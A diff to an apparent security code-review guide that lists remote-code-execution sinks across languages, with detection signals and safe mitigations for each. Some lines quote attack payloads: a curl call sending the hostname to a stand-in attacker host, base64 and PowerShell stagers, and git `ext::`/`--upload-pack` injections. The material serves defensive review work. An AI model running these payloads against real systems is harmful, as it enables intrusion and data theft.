@@ -89,6 +89,20 @@ curl https://attacker.tld/$(hostname)
 - Base64 stagers: `echo payload | base64 -d | sh`
 - PowerShell: `IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))`
 
+### VCS clone/fetch argument & config injection (git, hg, svn)
+
+When a user-controlled repository URL, ref, branch, or "import" string flows into a VCS command, two distinct bugs appear — **argument injection** (the value starts with `-`/`--` and is parsed as an option) and **config injection** (a crafted URL injects extra `git config` keys). Both are RCE/SSRF/file-read sinks even when there is no shell metacharacter, because the danger is in git's own option/config surface, not the shell.
+
+- **RCE via config/option keys:**
+  - `core.fsmonitor` / `core.sshCommand` / `core.pager` / `core.editor` set to a command → executed by subsequent git operations
+  - `protocol.ext.allow=always` + an `ext::sh -c <cmd>` remote → arbitrary command
+  - `--upload-pack=<cmd>` / `-u <cmd>` injected into `git clone`/`git fetch`/`ls-remote`
+  - submodule URLs beginning with `-` or `ext::` during recursive clone
+- **SSRF via config keys:** a URL crafted so the value lands as `http.proxy=http://internal:port` (e.g. the app builds `-c http.<url>.extraHeader=...` from the raw URL) routes git's HTTP through an attacker-chosen proxy → internal network access. See `ssrf.md`.
+- **Local file read / scheme abuse:** `file://`, `ext::`, `--upload-pack=cat` style.
+
+**SAST signal:** user input concatenated into `git clone|fetch|ls-remote|remote add|submodule`, `hg clone`, `svn checkout` argv (Go `exec.Command("git", ..., url)`, Node `simple-git`/`child_process`, Python `subprocess([...])`, Ruby backticks), or passed to a `-c key=value` / `--config` builder where the key portion is influenced by the URL. **SAFE:** validate scheme+host allowlist; reject values starting with `-` (or insert `--` end-of-options before user args); never derive a `git config` key from a user URL; set `protocol.ext.allow=never`, `GIT_PROTOCOL_FROM_USER=0`, and `-c http.followRedirects=false` explicitly.
+
 ### Template Injection
 
 Identify the server-side template engine in use: Jinja2/Twig/Blade/Freemarker/Velocity/Thymeleaf/EJS/Handlebars/Pug
@@ -156,6 +170,13 @@ pop graphic-context
 
 **ffmpeg**
 - concat/protocol tricks gated by compile-time flag configuration
+
+**Markup / markdown renderer option injection**
+- Some renderers let the *document content* set renderer **options**, which then select a class, formatter, template, or include path — turning "render untrusted markup" into class instantiation / file read / RCE:
+  - Kramdown inline `{::options /}` → `syntax_highlighter_opts` → Rouge `formatter` → `Rouge::Formatters.const_get(<attacker class>)` (arbitrary constant load → gadget)
+  - Kramdown `template=` option / RDoc `.rdoc_options` / AsciiDoc attributes (`{include::}`, backend/template) / reStructuredText `..raw::`/`..include::` directives
+- **SAST signal:** untrusted content (wiki pages, README/issue/comment bodies, uploaded `.md`/`.rmd`/`.adoc`/`.rst`) passed to a markup renderer **without disabling inline-options / unsafe directives / template selection**. Look for `Kramdown::Document.new(content)`, `GitHub::Markup.render`, `RDoc::Options`, Asciidoctor `safe: :unsafe`/`:server` instead of `:secure`, docutils with `file_insertion_enabled`/`raw_enabled` on.
+- **SAFE:** render in the most restricted safe mode (Asciidoctor `safe: :secure`, docutils `file_insertion_enabled=false`, `raw_enabled=false`), strip/forbid inline option blocks, pin the highlighter/formatter server-side, never let document content choose a class/template/include path.
 
 ### SSRF to RCE
 
@@ -236,10 +257,13 @@ Flag sinks where a non-constant variable appears in a dangerous position. Phase-
 
 | Language | Grep targets |
 |----------|--------------|
-| Python | `eval(`, `exec(`, `compile(` + exec, `importlib.import_module(`, `__import__(` |
-| JavaScript | `eval(`, `new Function(`, `setTimeout(.*\+`, `vm.runInNewContext(`, dynamic `require(` |
-| PHP | `eval(`, `preg_replace.*/e`, `assert(`, `create_function(`, `call_user_func(` |
-| Ruby | `eval(`, `instance_eval(`, `class_eval(`, `binding.eval(` |
+| Python | `eval(`, `exec(`, `compile(` + exec, `importlib.import_module(`, `__import__(`, `code.InteractiveConsole(`/`InteractiveInterpreter(` (`.push`/`.runsource`/`.runcode`), `logging.config.listen(` (eval-over-socket config server), `_xxsubinterpreters.run_string(`, `_testcapi.run_in_subinterp(` / `test.support.run_in_subinterp(` |
+| JavaScript | `eval(`, `new Function(`, `setTimeout(.*\+`, `vm.runInNewContext(`/`runInContext(`/`runInThisContext(`/`compileFunction(`, dynamic `require(`; sandbox libs that **do not** isolate untrusted code — `vm2` `new VM().run(`/`new NodeVM().run(`/`new VMScript(`, `sandbox` pkg `.run(`, and eval wrappers `notevil(`/`safe-eval`/`static-eval` (all bypassable → treat as `eval`). `isolated-vm` is safer but still RCE if the host bridges callbacks to untrusted code |
+| PHP | `eval(`, `preg_replace.*/e`, `mb_ereg_replace(.*'e'`, `assert(`, `create_function(`, `call_user_func(`/`call_user_func_array(` with tainted callable, `new $var(` |
+| Ruby | `eval(`, `instance_eval(`, `class_eval(`, `module_eval(`, `binding.eval(`, `Open3.pipeline(`/`pipeline_r(`/`pipeline_rw(`/`pipeline_w(`/`pipeline_start(` with built commands |
+| Go | embedded JS/script VMs run with tainted source — `otto` `vm.Run(`/`vm.Eval(`, `goja` `vm.RunString(`, `tengo`/`gopher-lua` `DoString(` |
+
+**Headless-browser / PDF-render code injection** — passing attacker-influenced script or HTML to a browser-automation or HTML-to-PDF engine executes arbitrary JS in the render context (and frequently reaches the local filesystem / internal network → also SSRF/LFI). Flag tainted input reaching: Puppeteer/Playwright `page.evaluate(`/`evaluateHandle(`/`evaluateOnNewDocument(`/`addInitScript(`/`page.setContent(`/`page.$eval(`; Chrome DevTools Protocol `Runtime.evaluate`/`Runtime.compileScript`/`Page.navigate`/`Page.setDocumentContent`; PhantomJS `page.evaluate`/`page.open`; `wkhtmltopdf`/`wkhtmltoimage` `.generate(` with user HTML; Deno `Deno.run(`/`new Deno.Command(`. **SAFE**: pass untrusted data as serialized **arguments** to `page.evaluate(fn, arg)` (never string-concatenate into the function body), render only server-controlled templates, disable JS in the PDF engine when not needed.
 
 **Unsafe deserialization** — flag all usages; confirm external data flow separately. See [insecure_deserialization.md](insecure_deserialization.md).
 
@@ -748,17 +772,53 @@ Class<?> clazz = allowed.get(request.getParameter("format"));
 if (clazz == null) throw new IllegalArgumentException("Unknown format");
 ```
 
+### Cross-language reflection sinks
+
+Reflection RCE is not Java-only. Flag a user-controlled string reaching any of these dynamic class/method resolvers:
+
+| Language | Sinks (user-controlled class or method name) |
+|----------|----------------------------------------------|
+| Java/Kotlin | `Class.forName(x)`, `ClassLoader.loadClass(x)`, `Method.invoke`, `getDeclaredConstructor().newInstance()` |
+| Ruby | `x.constantize` / `x.safe_constantize` / `x.classify.constantize`, `obj.send(x, ...)` / `public_send(x, ...)`, `Object.const_get(x)`, `x.to_sym` → dispatch (Rails dynamic render/`render template: x`) |
+| Python | `getattr(obj, x)(...)`, `__import__(x)` / `importlib.import_module(x)`, `globals()[x]` / `eval`/`exec` resolving a callable |
+| PHP | variable function `$x()`, variable method `$obj->$x()`, `call_user_func($x)` / `call_user_func_array`, `new $x(...)` (dynamic class instantiation) |
+| .NET | `Type.GetType(x)`, `Activator.CreateInstance(...)`, `Assembly.Load*(x)`, `MethodInfo.Invoke` on a user-named member |
+| Go | `plugin.Open(x).Lookup(y)`; `reflect.Value.MethodByName(x).Call(...)` |
+
+Tag `unsafe_reflection`/`rce` when the resolved class/method name is attacker-influenced and reaches instantiation or invocation without an allow-list. Ruby `constantize`/`send` and PHP `new $x`/`$obj->$x()` are frequent real-world sinks that lack any built-in allow-listing.
+
 ### Detection Rules
 
 - `Class.forName(userInput)` where `userInput` is derived from HTTP request data → **CONFIRM** (CWE-470)
 - `ClassLoader.loadClass(userInput)` with user-controlled class name → **CONFIRM**
 - Reflection combined with `newInstance()` or `Method.invoke()` on user-controlled targets → **CONFIRM**
+- Ruby `params[...].constantize` / `obj.send(params[...])`, PHP `new $userClass` / `$obj->$userMethod()`, Python `getattr(obj, user)(...)` → **CONFIRM**
 
 ### Tag Selection
 
 - When the reflection sink leads to arbitrary class instantiation or method invocation: tag as `rce`
 - When the reflection is limited to loading a class without instantiation and no further exploitation is evident: tag as `unsafe_reflection` if supported, otherwise `rce`
 - In benchmark mode, prefer the tag that matches the ground truth taxonomy of the project
+
+## Dynamic Library / Assembly / Module Load From Untrusted Path (CWE-114 / CWE-470)
+
+Distinct from `Class.forName` reflection: when user-controlled input chooses the **file path** of a native library, managed assembly, or runtime module to load, the loader maps and executes attacker-chosen code (initializers / DllMain / module top-level code run on load). This is RCE even without explicit instantiation. It also overlaps with path traversal (the path is the sink) and library search-order hijack (see `environment_variable_injection.md` for `LD_PRELOAD`/`PATH`-driven variants).
+
+**Sinks — load code from a path/name (flag when the path/name is tainted):**
+- **C/C++**: `dlopen`, `LoadLibrary`/`LoadLibraryEx`, `LoadPackagedLibrary` (also `CreateProcess` with an unquoted/relative path → search-order hijack, CWE-428)
+- **Java/JVM**: `System.load(path)`, `System.loadLibrary(name)`, `Runtime.load`/`loadLibrary`, `URLClassLoader(new URL[]{userUrl})`, `ServiceLoader` over a tainted classpath
+- **C# / .NET**: `Assembly.LoadFrom`/`LoadFile`/`Load(byte[])`, `Assembly.UnsafeLoadFrom`, `AppDomain.Load`, `NativeLibrary.Load`, `Activator.CreateInstanceFrom` (CWE-114 assembly-path injection)
+- **Python**: `ctypes.CDLL/WinDLL/cdll.LoadLibrary(path)`, `importlib.import_module(userName)` / `__import__`, `imp.load_source/load_dynamic`
+- **Node.js**: `require(userPath)`, dynamic `import(userPath)`, `process.dlopen(module, userPath)`
+- **Go**: `plugin.Open(userPath)`
+- **PHP**: `dl(userExtension)`
+- **Ruby**: `require`/`load`/`require_relative` with a user-controlled path
+
+**VULN (C#):** `Assembly.LoadFrom(Request.QueryString["plugin"]).CreateInstance(typeName);`
+**VULN (Python):** `ctypes.CDLL(request.args["lib"])`
+**SAFE:** resolve against a fixed plugin directory, canonicalize, verify the resolved path stays inside it, and load only from an allowlist of known module names — never a request-derived absolute/relative path. For native libraries, prefer a fixed, signed, absolute path.
+
+**Detection:** any loader sink above whose path/name argument is taint-reachable from request data → **CONFIRM** (`rce`). Loading from a fixed literal or an allowlisted name is **SAFE**.
 
 ## Source -> Sink Pattern
 
@@ -767,7 +827,7 @@ if (clazz == null) throw new IllegalArgumentException("Unknown format");
 - JavaScript command injection: `ClientRequest.getAResponseDataNode()` (server response as second-order source)
 
 **Sinks — Command Injection (CWE-078)**
-- **Java**: tainted arg to `Runtime.exec` when script interpreter invoked
+- **Java**: tainted arg to `Runtime.exec`/`ProcessBuilder` when script interpreter invoked; also library wrappers — Apache Commons Exec (`org.apache.commons.exec` `CommandLine.parse(userInput)` / `DefaultExecutor.execute`) and Apache Ant (`org.apache.tools.ant.taskdefs.Execute`, `ExecTask`)
 - **JavaScript**: `SystemCommandExecution.getACommandArgument()` — `child_process.exec`, `execSync`, `spawn` with shell; indirect/second-order command injection; shell command injection from environment
 - **Python**: `SystemCommandExecution.getCommand()` — `os.system`, `os.popen`, `subprocess.Popen/run/call` (excludes internal stdlib wrapper noise)
 - **Go**: `SystemCommandExecution.getCommandName()` — `exec.Command`, `exec.CommandContext`
